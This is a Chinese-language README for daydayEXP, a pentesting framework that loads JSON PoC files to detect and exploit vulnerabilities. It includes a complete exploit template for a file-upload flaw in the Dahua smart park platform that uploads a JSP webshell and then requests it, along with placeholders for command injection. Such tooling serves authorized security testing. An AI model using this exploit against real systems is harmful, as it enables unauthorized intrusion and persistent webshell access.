 <h1 align="center">daydayEXP</h1>
<h1 align="center">
	
## 项目简介：
受nuclei的设计思路影响，乱写的一款支持加载自定义poc文件的、可扩展的的渗透测试框架。项目反响还不错的话还会考虑继续更新....
  
### 使用：

执行命令或用bat批处理脚本打开（直接打开会有中文乱码等问题，并确保poc文件在当前目录下）

食用建议：建议开启代理配合burp食用

```
java -jar -Dfile.encoding=UTF-8 dadayExp-0.1-jar-with-dependencies.jar
```

#### 漏洞检测模块

选择一级列表内容可对所有该标签下的漏洞都进行检测，为多进程，默认线程为5。选择二级则对单个漏洞扫描。（因为多线程用的是继承Callable类，可能界面效果会不太好...）

![image](https://github.com/bcvgh/daydayEXP-readme/assets/56790427/b097a76a-7b79-49cb-ae46-b26c7549b5f5)

dnslog：在config.json中配置好dnslog api，面板中设置好dns地址即可食用。应用该功能可减少命令执行无回显或POC返回包特征值不明确导致的误报、漏报。（暂只支持ceye api）

下方例子中就可以看出，是否开启该模块会导致检测结果会有较大出入
![image](https://github.com/bcvgh/daydayEXP-readme/assets/56790427/1c2c08b6-06b2-4f10-bb37-bd48793f8709)
![image](https://github.com/bcvgh/daydayEXP-readme/assets/56790427/7face77c-f06a-4574-a189-8b112f219fff)



#### 漏洞利用模块
点击漏洞利用按钮，会根据当前漏洞的type类型动态生成场景

`(命令执行类)`

例如命令执行、代码执行、SQL注入xpcmdshell等都归结到这一类

![image](https://github.com/bcvgh/daydayEXP-readme/assets/56790427/b13e743f-ff0c-415a-baf3-0bdf1f3a871e)



`(文件上传类)`

例如文件上传、任意文件写入、任意文件覆盖等都归结到这一类

![image](https://github.com/bcvgh/daydayEXP-readme/assets/56790427/2127d444-46f3-461d-ac58-08807ed800ee)



`(反序列化类)`

开发中~~~~也没有想到较好的设计思路...
可以暂时用反序列化打内存马的poc直接当作文件上传类使用。



### POC编写

json文件中除了基本的name、tag等还有poc和exp两个模块(目前exp模块只支持type为upload或exec，如遇到其他类型漏洞，如：反序列化、未授权、sql注入等建议只设置好poc字段进行一个初步漏洞检测，后续手工进行利用)

对照其他poc的json文件，应该就能看懂编写规则。

```
name  :   漏洞名称
tag   ：  漏洞标签（如:fanwei、youyong等，需要正确填写，否则会影响到POC文件正确加载）
type  ：  漏洞类型（如:upload、exec、sql等，需要正确填写，否则影响EXP模块正常使用）
poc   :   漏洞检测
	pocGet:url路径
	pocPost:post数据
	header:
	Pattern：匹配返回包存在的特征值，通过匹配该字段确定漏洞是否存在
exp   ：
	step（n）：漏洞利用过程中的请求包先后顺序（step1代表请求的第一个数据包，step2、step3以此类推）
		expGet:url路径
		expPost:post数据
		header:
		Pattern：匹配返回包的内容（正则），当type类型为exec时，用来匹配返回包中的命令执行结果，upload类型则是一般用来匹配文件上传后随机生成的文件名。
```

例如:

```
{
  "name":"大华智慧园区管理平台文件上传",          //漏洞名称
  "tag":"dahua",							//漏洞标签（需要正确填写，否则影响POC文件正确加载）	
  "type":"upload",							//漏洞类型（需要正确填写，否则影响EXP模块正常使用）
  "poc": {									//根据模板编写，header头可自行添加修改
    "pocGet": "/publishing/publishing/material/file/video",			
    "pocPost": "id=1",												
    "header": {
      "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
      "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
      "User-Agent": "Mozilla/5.0 (Linux;"
    },
    "Pattern": "(上传文件为空，请重新上传)"		//存在漏洞时返回包存在的关键字（正则表达式必须用（）包含）
  },
  "exp": {									//按step1、step2...先后顺序发包
    "step1": {
      "expGet": "/publishing/publishing/material/file/video",
      "expPost": "------WebKitFormBoundaryCJEleSRxsqS0lAFv\r\nContent-Disposition: form-data; name=\"Filedata\";filename=\"24k.jsp\"\r\n\r\n{webshell}\r\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",
      "header": {
        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
        "User-Agent": "Mozilla/5.0 (Linux;"
      },
      "Pattern": "([0-9]*\\.jsp)"			//第一个包需要正则匹配的话多为文件上传类型，匹配随机生成的jsp脚本名称，如无需匹配返回包则用（）。注意：正则表达式必须用（）包含。
    },
    "step2": {
      "expGet": "/publishingImg/VIDEO/{shellPath}",			//第一个包需要正则匹配的话多为文件上传类型，匹配随机生成的jsp脚本名称
      "header": {
        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv",
        "User-Agent": "Mozilla/5.0 (Linux;"
      },
      "Pattern": "()"
    }
  }
}
```

占位符：

```
{仅poc内可用}
{dnslog}:配置好dnslog平台api即可食用。一般应用于命令执行无回显的情况，减少误报率。

{仅exp内可用}
{command}:命令执行
{shellPath}:匹配到返回包中的脚本名称，应用于上传后wenshell文件名随机生成且在返回包中有回显的场景。
{webshell}:需要上传的文件上传内容

{poc、exp内均可使用}
{random}:随机生成4位数字字母，应用于poc中需要不同特征字符的特殊场景
{url}:即当前目标的url地址，应用在一些网站中可能会校验refer头的情况

编码：
Base64Encode:对输入进行base64编码
Base64decode:对输入进行base64解码码
UrlEncode:url编码（全编码）
UrlDecode：url解码
HtmlEncode:HTML编码
HtmlDecode:HTML解码


如：{webshell:Base64Encode:n}，{command:UrlEncode:3}其中n表示编码次数。（如泛微browser注入漏洞可能会用到{command:UrlEncode:3}，其他一般情况编码一次即可）
```
poc文件夹
![1695212448172](https://github.com/bcvgh/daydayEXP/assets/56790427/d6bf2aec-d0aa-4f1c-89d8-b76550b854e3)



```
